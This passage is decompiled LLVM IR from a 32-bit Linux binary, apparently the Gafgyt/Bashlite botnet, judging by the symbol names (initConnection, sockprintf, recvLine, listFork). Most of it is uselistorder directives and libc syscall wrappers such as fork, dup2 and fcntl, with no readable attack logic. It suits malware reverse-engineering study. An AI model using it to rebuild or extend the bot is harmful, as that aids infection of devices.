  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_804f4c3 ], [ %stack_var_-60.3.ph28, %dec_label_pc_804f8cf.outer26 ]
  store i32 %v2_804f8cf, i32* %eax.global-to-local, align 4
  %v0_804f8d5 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804f8d5, i32* %edx.global-to-local, align 4
  %v5_804f8db = icmp ult i32 %v0_804f8db, 4
  store i1 %v5_804f8db, i1* %cf.global-to-local, align 1
  %v1_804f8de = add i32 %v0_804f8db, -8
  %v2_804f8de = inttoptr i32 %v1_804f8de to i32*
  store i32 4096, i32* %v2_804f8de, align 4
  %v2_804f8e3 = add i32 %v0_804f8db, -12
  %v3_804f8e3 = inttoptr i32 %v2_804f8e3 to i32*
  store i32 %v2_804f8cf, i32* %v3_804f8e3, align 4
  %v0_804f8e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f8e4 = add i32 %v0_804f8db, -16
  %v3_804f8e4 = inttoptr i32 %v2_804f8e4 to i32*
  store i32 %v0_804f8e4, i32* %v3_804f8e4, align 4
  %v0_804f8e5 = call i32 @recvLine()
  store i32 %v0_804f8e5, i32* %eax.global-to-local, align 4
  %v0_804f8ea = load i32, i32* @esp, align 4
  %v8_804f8f0 = icmp ne i32 %v0_804f8e5, -1
  store i1 %v8_804f8f0, i1* %cf.global-to-local, align 1
  %v13_804f8f0 = icmp eq i32 %v0_804f8e5, -1
  %v1_804f8f4 = icmp eq i1 %v13_804f8f0, false
  br i1 %v1_804f8f4, label %dec_label_pc_804f425, label %dec_label_pc_804f217.outer

; uselistorder directives
  uselistorder i32 %v0_804f8e5, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_804f8db, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph29, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph27, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v4_804f8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge233, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804f883, { 2, 1, 0 }
  uselistorder i32 %v3_804f86e, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_804f864, { 2, 1, 0 }
  uselistorder i32 %v1_804f82e, { 1, 0 }
  uselistorder i32 %v1_804f7fc, { 1, 0 }
  uselistorder i32 %v5_804f7d4, { 1, 0 }
  uselistorder i32 %v4_804f7d1, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.155, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_804f7e1, { 2, 0, 1 }
  uselistorder i32 %v1_804f7bd, { 1, 0 }
  uselistorder i32 %v0_804f786, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804f743, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f725, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f709, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32 %v0_804f6f6, { 1, 2, 0 }
  uselistorder i32 %v0_804f6db, { 1, 2, 3, 0 }
  uselistorder i1 %v0_804f69e, { 1, 0 }
  uselistorder i32 %v7_804f69c, { 1, 0 }
  uselistorder i8* %v22_804f638, { 0, 2, 1 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_804f660, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804f651, { 1, 0 }
  uselistorder i32 %storemerge15.in227, { 2, 1, 0 }
  uselistorder i8* %storemerge15228, { 1, 0 }
  uselistorder i32 %v6_804f60b, { 1, 0 }
  uselistorder i32 %v6_804f5e3, { 1, 0 }
  uselistorder i32 %v6_804f5be, { 1, 0 }
  uselistorder i32 %v1_804f5d3, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804f59b, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804f598, { 9, 8, 13, 6, 7, 11, 10, 0, 4, 1, 2, 3, 12, 14, 5, 15, 16, 17 }
  uselistorder i32 %v6_804f595, { 1, 0 }
  uselistorder i8* %storemerge16.lcssa, { 1, 0 }
  uselistorder i32 %v5_804f548, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 1, 0 }
  uselistorder i32 %v4_804f501, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_804f4ed, { 0, 2, 1 }
  uselistorder i32 %v0_804f4b4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_804f4af, { 0, 2, 1 }
  uselistorder i32 %v0_804f49d, { 1, 2, 0 }
  uselistorder i32 %v0_804f43f, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_804f439, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v0_804f28e.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804f3c7, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804f394, { 2, 0, 1 }
  uselistorder i32 %v1_804f37d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804f348, { 1, 0 }
  uselistorder i32 %v0_804f2ed, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804f2bc, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804f27f, { 1, 0 }
  uselistorder i32 %v0_804f22f, { 0, 2, 1 }
  uselistorder i8* %storemerge16190, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804f535, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_804f6c2, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v2_804f8cf, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804f17d, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f124, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp164, { 1, 0, 2 }
  uselistorder i32 %v2_804f0a8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804f055, { 1, 0 }
  uselistorder i32 %v3_804f12113, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp160, { 1, 0, 2 }
  uselistorder i1 %v5_804ef98, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804ef5d, { 1, 0, 2 }
  uselistorder i1 %v5_804ef49, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804eeb9, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-5888, { 23, 24, 22, 21, 20, 19, 16, 15, 18, 17, 25, 26, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 21, 22, 0, 1, 2, 9, 10, 11, 12, 13, 20, 15, 14, 16, 18, 17, 19, 23, 24, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 118, 119, 5, 3, 4, 135, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 57, 18, 19, 20, 54, 55, 58, 59, 60, 61, 62, 71, 63, 64, 67, 68, 65, 66, 134, 133, 69, 70, 72, 73, 136, 132, 74, 75, 76, 79, 80, 81, 77, 78, 82, 83, 84, 85, 86, 87, 88, 89, 2, 0, 90, 91, 92, 93, 94, 95, 97, 98, 96, 99, 100, 101, 117, 102, 103, 106, 104, 105, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 120, 121, 122, 124, 123, 1, 125, 126, 127, 128, 129, 21, 130, 131, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i1* %cf.global-to-local, { 104, 105, 3, 2, 119, 4, 5, 12, 6, 7, 8, 9, 10, 11, 1, 13, 14, 15, 62, 63, 16, 17, 60, 61, 64, 65, 66, 67, 68, 71, 72, 69, 70, 0, 73, 74, 118, 75, 76, 78, 79, 77, 80, 81, 82, 83, 59, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 103, 97, 98, 99, 100, 101, 102, 106, 107, 108, 109, 117, 110, 111, 112, 113, 114, 21, 22, 115, 116, 18, 58, 19, 20, 23, 24, 25, 28, 29, 30, 31, 32, 26, 27, 36, 37, 33, 34, 35, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 5, 6, 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @szprintf, { 25, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @listFork, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strstr, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_8057157.21 to i32), { 2, 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32)* @sockprintf, { 3, 2, 1, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 29, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @sleep, { 4, 0, 3, 2, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 2, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_805f62d.685 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i8* bitcast (i8** @global_var_805f621.682 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_805f614.681 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805f612.680 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_805f5ff.679 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 6, 7, 8, 0, 1, 2, 3, 9, 10, 4, 5 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 9, 10, 11, 0, 12, 13, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 3, 4, 5, 6, 7, 8, 24, 25 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 8, 2, 3, 0, 1, 4, 5, 9, 10, 11, 7, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_804f8cf.outer26, { 1, 0 }
  uselistorder label %dec_label_pc_804f8ae, { 1, 0 }
  uselistorder label %dec_label_pc_804f864, { 1, 0 }
  uselistorder label %dec_label_pc_804f7d1, { 1, 0 }
  uselistorder label %dec_label_pc_804f7a5, { 1, 0 }
  uselistorder label %dec_label_pc_804f76f, { 1, 0 }
  uselistorder label %dec_label_pc_804f643, { 1, 0 }
  uselistorder label %dec_label_pc_804f632, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f629, { 1, 0 }
  uselistorder label %dec_label_pc_804f5c5, { 1, 0 }
  uselistorder label %dec_label_pc_804f55d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f554, { 1, 0 }
  uselistorder label %dec_label_pc_804f8cf.outer26.backedge, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_804f529, { 1, 0 }
  uselistorder label %dec_label_pc_804f422, { 1, 0 }
  uselistorder label %dec_label_pc_804f3b3, { 1, 0 }
  uselistorder label %dec_label_pc_804f391, { 1, 0 }
  uselistorder label %dec_label_pc_804f2d9, { 1, 0 }
  uselistorder label %dec_label_pc_804f2af, { 1, 0 }
  uselistorder label %dec_label_pc_804f220, { 1, 0 }
  uselistorder label %dec_label_pc_804f217.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f1f1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f178, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804f073, { 1, 0 }
  uselistorder label %dec_label_pc_804efd1, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f906 = call i32 @vfork()
  %v5_804f909 = icmp ult i32 %v0_804f906, -4095
  %v1_804f90e = icmp eq i1 %v5_804f909, false
  call void @__pseudo_cond_branch(i1 %v1_804f90e, i32 134561072)
  ret i32 %v0_804f906
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f918 = load i32, i32* @edi, align 4
  %v0_804f919 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804f92d = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804f937 = icmp ugt i32 %v1_804f92d, 2
  br i1 %v6_804f937, label %dec_label_pc_804f947, label %dec_label_pc_804f939

dec_label_pc_804f939:                             ; preds = %entry
  %v4_804f93d = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f92d)
  br label %dec_label_pc_804f969

dec_label_pc_804f947:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f94f = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f94f, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804f94f, -4095
  br i1 %tmp17, label %dec_label_pc_804f967, label %dec_label_pc_804f95b

dec_label_pc_804f95b:                             ; preds = %dec_label_pc_804f947
  %v1_804f95b = call i32 @__errno_location(i32 %v0_804f919)
  %v0_804f960 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f960 = sub i32 0, %v0_804f960
  %v2_804f962 = inttoptr i32 %v1_804f95b to i32*
  store i32 %v1_804f960, i32* %v2_804f962, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f967

dec_label_pc_804f967:                             ; preds = %dec_label_pc_804f947, %dec_label_pc_804f95b
  %v0_804f967 = phi i32 [ %v2_804f94f, %dec_label_pc_804f947 ], [ -1, %dec_label_pc_804f95b ]
  br label %dec_label_pc_804f969

dec_label_pc_804f969:                             ; preds = %dec_label_pc_804f939, %dec_label_pc_804f967
  %v0_804f96e = phi i32 [ %v4_804f93d, %dec_label_pc_804f939 ], [ %v0_804f967, %dec_label_pc_804f967 ]
  store i32 %v0_804f919, i32* @ebx, align 4
  store i32 %v0_804f918, i32* @edi, align 4
  ret i32 %v0_804f96e

; uselistorder directives
  uselistorder i32 %v2_804f94f, { 1, 0, 2 }
  uselistorder i32 %v0_804f919, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f969, { 1, 0 }
  uselistorder label %dec_label_pc_804f967, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f970 = load i32, i32* @edi, align 4
  store i32 %v0_804f970, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804f988 = load i32, i32* @ebx, align 4
  %v1_804f990 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f990, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804f990, -4095
  br i1 %tmp11, label %dec_label_pc_804f9a8, label %dec_label_pc_804f99c

dec_label_pc_804f99c:                             ; preds = %entry
  %v1_804f99c = call i32 @__errno_location(i32 %v0_804f988)
  %v0_804f9a1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f9a1 = sub i32 0, %v0_804f9a1
  %v2_804f9a3 = inttoptr i32 %v1_804f99c to i32*
  store i32 %v1_804f9a1, i32* %v2_804f9a3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f9a8

dec_label_pc_804f9a8:                             ; preds = %entry, %dec_label_pc_804f99c
  %v0_804f9a8 = phi i32 [ %v1_804f990, %entry ], [ -1, %dec_label_pc_804f99c ]
  %v2_804f9ad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f9ad, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f9a8

; uselistorder directives
  uselistorder i32 %v1_804f990, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9a8, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f9d8 = load i32, i32* @edi, align 4
  store i32 %v0_804f9d8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804f9e0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f9e8 = call i32 @chdir(i32 %v0_804f9e0)
  store i32 %v0_804f9e0, i32* @ebx, align 4
  store i32 %v1_804f9e8, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804f9e8, -4095
  br i1 %tmp8, label %dec_label_pc_804fa00, label %dec_label_pc_804f9f4

dec_label_pc_804f9f4:                             ; preds = %entry
  %v1_804f9f4 = call i32 @__errno_location(i32 %v0_804f9e0)
  %v0_804f9f9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f9f9 = sub i32 0, %v0_804f9f9
  %v2_804f9fb = inttoptr i32 %v1_804f9f4 to i32*
  store i32 %v1_804f9f9, i32* %v2_804f9fb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa00

dec_label_pc_804fa00:                             ; preds = %entry, %dec_label_pc_804f9f4
  %v0_804fa00 = phi i32 [ %v1_804f9e8, %entry ], [ -1, %dec_label_pc_804f9f4 ]
  %v2_804fa02 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fa02, i32* @edx, align 4
  %v2_804fa04 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa04, i32* @edi, align 4
  ret i32 %v0_804fa00

; uselistorder directives
  uselistorder i32 %v1_804f9e8, { 1, 0, 2 }
  uselistorder i32 %v0_804f9e0, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fa00, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa08 = load i32, i32* @edi, align 4
  store i32 %v0_804fa08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fa10 = load i32, i32* @ebx, align 4
  %v1_804fa18 = call i32 @close(i32 %arg1)
  store i32 %v0_804fa10, i32* @ebx, align 4
  store i32 %v1_804fa18, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804fa18, -4095
  br i1 %tmp8, label %dec_label_pc_804fa30, label %dec_label_pc_804fa24

dec_label_pc_804fa24:                             ; preds = %entry
  %v1_804fa24 = call i32 @__errno_location(i32 %v0_804fa10)
  %v0_804fa29 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa29 = sub i32 0, %v0_804fa29
  %v2_804fa2b = inttoptr i32 %v1_804fa24 to i32*
  store i32 %v1_804fa29, i32* %v2_804fa2b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa30

dec_label_pc_804fa30:                             ; preds = %entry, %dec_label_pc_804fa24
  %v0_804fa30 = phi i32 [ %v1_804fa18, %entry ], [ -1, %dec_label_pc_804fa24 ]
  %v2_804fa32 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fa32, i32* @edx, align 4
  %v2_804fa34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa34, i32* @edi, align 4
  ret i32 %v0_804fa30

; uselistorder directives
  uselistorder i32 %v1_804fa18, { 1, 0, 2 }
  uselistorder i32 %v0_804fa10, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fa30, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa38 = load i32, i32* @ebx, align 4
  store i32 %v0_804fa38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804fa4b = call i32 @dup2(i32 %v0_804fa38, i32 %tmp4)
  store i32 %v2_804fa4b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804fa4b, -4095
  br i1 %tmp8, label %dec_label_pc_804fa64, label %dec_label_pc_804fa58

dec_label_pc_804fa58:                             ; preds = %entry
  %v0_804fa58 = load i32, i32* %stack_var_-4, align 4
  %v1_804fa58 = call i32 @__errno_location(i32 %v0_804fa58)
  %v0_804fa5d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa5d = sub i32 0, %v0_804fa5d
  %v2_804fa5f = inttoptr i32 %v1_804fa58 to i32*
  store i32 %v1_804fa5d, i32* %v2_804fa5f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa64

dec_label_pc_804fa64:                             ; preds = %entry, %dec_label_pc_804fa58
  %v0_804fa64 = phi i32 [ %v2_804fa4b, %entry ], [ -1, %dec_label_pc_804fa58 ]
  %v2_804fa68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa68, i32* @ebx, align 4
  ret i32 %v0_804fa64

; uselistorder directives
  uselistorder i32 %v2_804fa4b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fa64, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa6c = load i32, i32* @ebx, align 4
  store i32 %v0_804fa6c, i32* %stack_var_-4, align 4
  %v1_804fa75 = call i32 @fork(i32 %v0_804fa6c)
  store i32 %v1_804fa75, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804fa75, -4095
  br i1 %tmp6, label %dec_label_pc_804fa8c, label %dec_label_pc_804fa80

dec_label_pc_804fa80:                             ; preds = %entry
  %v0_804fa80 = load i32, i32* %stack_var_-4, align 4
  %v1_804fa80 = call i32 @__errno_location(i32 %v0_804fa80)
  %v0_804fa85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa85 = sub i32 0, %v0_804fa85
  %v2_804fa87 = inttoptr i32 %v1_804fa80 to i32*
  store i32 %v1_804fa85, i32* %v2_804fa87, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa8c

dec_label_pc_804fa8c:                             ; preds = %entry, %dec_label_pc_804fa80
  %v0_804fa8c = phi i32 [ %v1_804fa75, %entry ], [ -1, %dec_label_pc_804fa80 ]
  %v2_804fa8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fa8e, i32* @edx, align 4
  %v2_804fa90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa90, i32* @ebx, align 4
  ret i32 %v0_804fa8c

; uselistorder directives
  uselistorder i32 %v1_804fa75, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa8c, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_804fa94 = load i32, i32* @ebp, align 4
  %v0_804fa95 = load i32, i32* @edi, align 4
  %v0_804fa96 = load i32, i32* @esi, align 4
  %v0_804fa97 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804faa3 = icmp eq i32 %arg2, 0
  %v1_804faa5 = icmp eq i1 %v1_804faa3, false
  br i1 %v1_804faa5, label %dec_label_pc_804fad0, label %dec_label_pc_804faa7

dec_label_pc_804faa7:                             ; preds = %entry
  %v1_804faa7 = icmp eq i32 %arg1, 0
  br i1 %v1_804faa7, label %dec_label_pc_804fabb, label %dec_label_pc_804faab

dec_label_pc_804faab:                             ; preds = %dec_label_pc_804faa7
  %v1_804faab = call i32 @__errno_location(i32 %v0_804fa97)
  %v1_804fab0 = inttoptr i32 %v1_804faab to i32*
  store i32 22, i32* %v1_804fab0, align 4
  br label %dec_label_pc_804fb41

dec_label_pc_804fabb:                             ; preds = %dec_label_pc_804faa7
  %v3_804fabb = call i32 @__GI_getpagesize(i32 %v0_804fa97, i32 %v0_804fa96, i32 %v0_804fa95)
  store i32 %v3_804fabb, i32* @ebx, align 4
  %v5_804fac7 = icmp slt i32 %v3_804fabb, 4096
  br i1 %v5_804fac7, label %dec_label_pc_804fac9, label %dec_label_pc_804fad8

dec_label_pc_804fac9:                             ; preds = %dec_label_pc_804fabb
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_804fad8

dec_label_pc_804fad0:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804fad4 = icmp eq i32 %arg1, 0
  %v1_804fad6 = icmp eq i1 %v1_804fad4, false
  br i1 %v1_804fad6, label %dec_label_pc_804faea, label %dec_label_pc_804fad8

dec_label_pc_804fad8:                             ; preds = %dec_label_pc_804fabb, %dec_label_pc_804fad0, %dec_label_pc_804fac9
  %v0_804fadb = phi i32 [ %v3_804fabb, %dec_label_pc_804fabb ], [ %arg2, %dec_label_pc_804fad0 ], [ 4096, %dec_label_pc_804fac9 ]
  store i32 %v0_804fadb, i32* %stack_var_-44, align 4
  %v1_804fadc = call i32 @malloc(i32 %v0_804fadb)
  store i32 %v1_804fadc, i32* @esi, align 4
  %v1_804fae6 = icmp eq i32 %v1_804fadc, 0
  br i1 %v1_804fae6, label %dec_label_pc_804fb41, label %dec_label_pc_804fad8.dec_label_pc_804faea_crit_edge

dec_label_pc_804fad8.dec_label_pc_804faea_crit_edge: ; preds = %dec_label_pc_804fad8
  %v0_804faf5.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804faea

dec_label_pc_804faea:                             ; preds = %dec_label_pc_804fad8.dec_label_pc_804faea_crit_edge, %dec_label_pc_804fad0
